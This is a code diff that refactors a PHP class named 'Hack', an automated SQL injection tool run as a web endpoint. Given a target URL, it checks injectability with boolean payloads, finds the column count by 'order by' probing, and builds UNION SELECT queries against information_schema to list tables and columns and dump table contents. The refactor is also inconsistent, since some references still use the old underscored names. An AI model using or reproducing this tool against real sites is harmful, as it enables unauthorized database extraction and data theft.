@@ -33,23 +33,23 @@ class Hack
 	const NBR_POTENTIAL_COL_ITERATION	= 50;
 	
 	/** @var string current action */
-	protected $_action 					= "";
+	protected $action 					= "";
 	
 	/** @var string current url */
-	protected $_url 					= "";
+	protected $url 						= "";
 	
 	/** @var string suffix  */
-	protected $_suffix 					= "";
+	protected $suffix 					= "";
 	
 	/** @var string file name */
-	protected $_filepath 				=  "/var/log/process.log";
+	protected $filepath					=  "/var/log/process.log";
 	
 	/**
 	 * construct
 	 */
 	public function __construct()
 	{
-		$this->_filepath = dirname(__FILE__) . $this->_filepath;
+		$this->filepath = dirname(__FILE__) . $this->filepath;
 	}
 	
 	/**
@@ -59,24 +59,24 @@ class Hack
 	 */
 	public function action()
 	{
-		if (!isset($_GET['action']) || !in_array($_GET['action'], $this->_getAvailablesAction())) {
-			return $this->_sendResponse(array('error' => 'Action not available'));
+		if (!isset($_GET['action']) || !in_array($_GET['action'], $this->getAvailablesAction())) {
+			return $this->sendResponse(array('error' => 'Action not available'));
 		} 
 		
-		$this->_url 	= (isset($_GET['url'])) ? base64_decode($_GET['url']) : null; 
+		$this->url 	= (isset($_GET['url'])) ? base64_decode($_GET['url']) : null; 
 		
-		if ($this->_url  === null || $this->_checkUrl($this->_url) !== 1) {
-			return $this->_sendResponse(array('error' => 'Url is incorrect'));
+		if ($this->url  === null || $this->_checkUrl($this->url) !== 1) {
+			return $this->sendResponse(array('error' => 'Url is incorrect'));
 		}
 		
 		$this->_action 	= $_GET['action'];
 		
-		$method 		= lcfirst(str_replace(' ','',ucwords(str_replace('_',' ', $this->_action))));
+		$method 		= lcfirst(str_replace(' ','',ucwords(str_replace('_',' ', $this->action))));
 		
 		if (method_exists($this, $method)) {
 			$this->$method();
 		} else {
-			return $this->_sendResponse(array('error' => 'Method not available'));
+			return $this->sendResponse(array('error' => 'Method not available'));
 		}
 	}
 	
@@ -88,14 +88,14 @@ class Hack
 	protected function checkIsHackableAction()
 	{
 		$data 				= array();
-		$url 				= $this->_url . '+and+1=0--';
-		$before 			= $this->_call($url);
-		$url				= $this->_url . '+and+1=1--';
-		$after 				= $this->_call($url);
+		$url 				= $this->url . '+and+1=0--';
+		$before 			= $this->call($url);
+		$url				= $this->url . '+and+1=1--';
+		$after 				= $this->call($url);
 		$data['success'] 	= (strlen($before) != strlen($after)) ? 1 : 0;
 		$data['url_call'] 	= $url;
 		
-		return $this->_sendResponse($data);
+		return $this->sendResponse($data);
 	}
 	
 	/**
@@ -109,14 +109,14 @@ class Hack
 		$data 		= array();
 
 		for ($i=1;$i<=self::NBR_POTENTIAL_COL_ITERATION;$i++) {
-			$url = $this->_url . '+order+by+' .$i.'--';
-			$content = $this->_call($url);
+			$url = $this->url . '+order+by+' .$i.'--';
+			$content = $this->call($url);
 			
-			$this->_log('Search for col : ' . $i);
+			$this->log('Search for col : ' . $i);
 			
 			if (strrpos($content, 'mysql_fetch_array()') !== false) {
 				$nbrCols = $i - 1;
-				$this->_log('FIND for col : ' . $nbrCols);
+				$this->log('FIND for col : ' . $nbrCols);
 				break;
 			}
 		}
@@ -124,7 +124,7 @@ class Hack
 		$data['nbr_cols'] 	= $nbrCols;
 		$data['url_call']	= $url;
 		
-		return $this->_sendResponse($data);
+		return $this->sendResponse($data);
 	}
 	
 	/**
@@ -149,19 +149,19 @@ class Hack
 				$cols[] = 'group_concat(distinct+table_name+order+by+table_name+asc)';
 			}
 			
-			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->_url) . '+union+select+' . implode(',', $cols) . '+from+information_schema.tables--';
+			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->url) . '+union+select+' . implode(',', $cols) . '+from+information_schema.tables--';
 			
-			$content = utf8_encode($this->_call($url));
+			$content = utf8_encode($this->call($url));
 			
-			$content = $this->_getUpperCaseInfo($content);
+			$content = $this->getUpperCaseInfo($content);
 			
 			$data['tables']	 	= $content;
 			$data['url_call']	= $url;
 			
-			return $this->_sendResponse($data);
+			return $this->sendResponse($data);
 		}
 		
-		return $this->_sendResponse($errors);
+		return $this->sendResponse($errors);
 	}
 	
 	/**
@@ -182,7 +182,7 @@ class Hack
 		}
 	
 		if (empty($errors)) {
-			$tableName 	= $this->_asciiConvertor($_GET['table']);
+			$tableName 	= $this->asciiConvertor($_GET['table']);
 			$nbrCols 	= $_GET['nbr_cols'];
 			
 			$cols = array();
@@ -190,18 +190,18 @@ class Hack
 				$cols[] = 'group_concat(column_name)';
 			}
 			
-			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->_url) . '+union+select+' . implode(',', $cols)
+			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->url) . '+union+select+' . implode(',', $cols)
 			. '+from+information_schema.columns+where+table_name='.$tableName.'--';
 			
-			$content = utf8_encode($this->_call($url));
-			$content = $this->_getUpperCaseInfo($content);
+			$content = utf8_encode($this->call($url));
+			$content = $this->getUpperCaseInfo($content);
 			
 			$data['columns'] 	= $content;
 			$data['url_call'] 	= $url;
 			
-			return $this->_sendResponse($data);
+			return $this->sendResponse($data);
 		}
-		return $this->_sendResponse($errors);
+		return $this->sendResponse($errors);
 	}
 	
 	/**
@@ -242,18 +242,18 @@ class Hack
 				$cols[] = 'CONVERT('.$colName[$z].' USING utf8)';
 			}
 			
-			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->_url) . '+union+select+' . implode(',', $cols)
-			. '+from+'.$tableName. $this->_getSuffixTable() . '--';
+			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->url) . '+union+select+' . implode(',', $cols)
+			. '+from+'.$tableName. $this->getSuffixTable() . '--';
 			
-			$content = utf8_encode($this->_call($url));
+			$content = utf8_encode($this->call($url));
 			
 			$data['content'] 	= $content;
 			$data['url_call'] 	= $url;
 			
-			return $this->_sendResponse($data);
+			return $this->sendResponse($data);
 		}
 
-		return $this->_sendResponse($errors);
+		return $this->sendResponse($errors);
 	}
 	
 	/**
@@ -264,8 +264,8 @@ class Hack
 	protected function getLogAction()
 	{
 		$data = array();
-		$data['content'] = file_get_contents($this->_filepath);
-		return $this->_sendResponse($data);
+		$data['content'] = file_get_contents($this->filepath);
+		return $this->sendResponse($data);
 	}
 	
 	/**
@@ -273,7 +273,7 @@ class Hack
 	 *
 	 * @param unknown_type $msg
 	 */
-	private function _log($msg)
+	private function log($msg)
 	{
 		$fd = fopen($this->_filepath, "w");
 		$str = "[" . date("Y/m/d h:i:s", mktime()) . "] " . $msg;
@@ -286,9 +286,9 @@ class Hack
 	 *
 	 * @return string
 	 */
-	protected function _getSuffixTable()
+	protected function getSuffixTable()
 	{
-		return $this->_getSuffix('table');
+		return $this->getSuffix('table');
 	}
 	
 	/**
@@ -311,9 +311,9 @@ class Hack
 	 * 
 	 * @return Hack
 	 */
-	private function _setSuffix($suffix, $key)
+	private function setSuffix($suffix, $key)
 	{
-		$this->_suffix[$key] = $suffix;
+		$this->suffix[$key] = $suffix;
 		return $this;
 	}
 	
@@ -322,9 +322,9 @@ class Hack
 	 * 
 	 * @param string $key
 	 */
-	private function _getSuffix($key)
+	private function getSuffix($key)
 	{
-		return (isset($this->_suffix[$key])) ? $this->_suffix[$key] : "";
+		return (isset($this->suffix[$key])) ? $this->suffix[$key] : "";
 	}
 	
 	/**
@@ -332,7 +332,7 @@ class Hack
 	 *
 	 * @return string
 	 */
-	private function _getUpperCaseInfo($content)
+	private function getUpperCaseInfo($content)
 	{
 		$result = "";
 		$matches = array();
@@ -352,7 +352,7 @@ class Hack
 	 *
 	 * @return array
 	 */
-	private function _getAvailablesAction()
+	protected function getAvailablesAction()
 	{
 		return array (
 			self::CHECK_IS_HACKABLE_ACTION,
@@ -370,7 +370,7 @@ class Hack
 	 * 
 	 * @return string
 	 */
-	private function _asciiConvertor($string)
+	protected function asciiConvertor($string)
 	{
 		$convertors = array();
 		
@@ -388,7 +388,7 @@ class Hack
 	 *
 	 * @return boolean
 	 */
-	private function _checkUrl($url)
+	private function checkUrl($url)
 	{
 		return preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i", $url);
 	}
@@ -400,7 +400,7 @@ class Hack
 	 * 
 	 * @return void
 	 */
-	protected function _sendResponse($data)
+	protected function sendResponse($data)
 	{
 		header('Content-Type: application/json');
 		
@@ -421,7 +421,7 @@ class Hack
 	 *
 	 * @return string
 	 */
-	private function _call($url)
+	private function call($url)
 	{
 		return strip_tags(file_get_contents($url));
 	}
